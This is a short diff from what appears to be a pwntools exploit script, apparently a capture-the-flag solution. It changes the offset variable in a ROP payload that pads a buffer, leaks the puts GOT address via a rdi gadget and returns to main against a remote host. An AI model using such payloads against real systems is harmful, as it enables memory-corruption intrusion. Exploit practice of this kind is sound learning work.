@@ -14,7 +14,7 @@ rop = ROP(BINARY)
 p = remote(URL, PORT)
 
 payload1 = flat(
-        b"A"*offset,
+        b"A"*OFFSET,
         rop.rdi.address, elf.got['puts'],
         elf.symbols['puts'],
         elf.symbols['main']
